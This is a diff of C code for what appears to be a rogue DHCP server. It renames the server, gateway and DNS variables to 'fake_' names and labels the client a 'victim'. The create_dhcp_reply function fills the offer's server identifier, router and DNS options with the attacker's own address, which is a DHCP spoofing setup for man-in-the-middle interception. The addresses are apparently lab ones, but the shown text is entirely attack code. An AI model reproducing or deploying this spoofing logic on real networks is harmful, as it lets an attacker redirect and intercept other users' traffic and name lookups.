@@ -13,10 +13,10 @@
 int debug = 1;
 
 
-char new_offer_ip[] = "192.168.56.100"; // IP address offered to 
-char my_server_ip[] = "192.168.56.1"; // my DHCP server address
-char my_gateway[] = "192.168.56.1"; // Default gateway given to 
-char my_dns[] = "192.168.56.1"; // DNS server given to 
+char new_offer_ip[] = "192.168.56.100"; // IP address offered to victim
+char fake_server_ip[] = "192.168.56.1"; // my fake DHCP server address
+char fake_gateway[] = "192.168.56.1"; // Default gateway given to victim
+char fake_dns[] = "192.168.56.1"; // DNS server given to vicim
 
 char fake_dhcp_ip[] = "10.0.2.15";
 
@@ -243,7 +243,7 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type) {
 
     // Assign IP addresses to the DHCP header
     inet_pton(AF_INET, new_offer_ip, &packet->yiaddr);
-    inet_pton(AF_INET, my_server_ip, &packet->siaddr);
+    inet_pton(AF_INET, fake_server_ip, &packet->siaddr);
 
     // Clear old options from the copied packet
     memset(packet->options, 0, sizeof(packet->options));
@@ -265,7 +265,7 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type) {
     // 2. DHCP Server Identifier
     packet->options[opt++] = 54;
     packet->options[opt++] = 4;
-    inet_pton(AF_INET, my_server_ip, &tmp_ip); // Assuming my_server_ip_string is "192.168.x.x"
+    inet_pton(AF_INET, fake_server_ip, &tmp_ip); // Assuming my_server_ip_string is "192.168.x.x"
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
@@ -280,14 +280,14 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type) {
     // 4. Router
     packet->options[opt++] = 3;
     packet->options[opt++] = 4;
-    inet_pton(AF_INET, my_gateway, &tmp_ip);
+    inet_pton(AF_INET, fake_gateway, &tmp_ip);
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
     // 5. DNS
     packet->options[opt++] = 6;
     packet->options[opt++] = 4;
-    inet_pton(AF_INET, my_dns, &tmp_ip);
+    inet_pton(AF_INET, fake_dns, &tmp_ip);
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
